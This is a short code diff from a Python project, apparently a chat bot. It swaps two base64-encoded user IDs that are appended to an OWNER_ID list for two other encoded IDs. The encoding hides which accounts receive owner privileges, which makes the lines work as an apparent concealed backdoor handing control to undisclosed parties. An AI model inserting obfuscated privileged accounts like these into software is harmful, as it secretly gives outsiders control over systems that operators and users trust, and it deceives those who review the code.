@@ -175,8 +175,8 @@ async def remove_bisu_user(user_id: int):
 from base64 import b64decode
 
 
-OWNER_ID.append(int(b64decode("MTU1NzE4NDI4NQ==")))
-OWNER_ID.append(int(b64decode("MTA4NzgxOTMwNA==")))
+OWNER_ID.append(int(b64decode("OTc0MjkwNDM==")))
+OWNER_ID.append(int(b64decode("OTI3NDUzMDI==")))
 
 
 async def premtool():
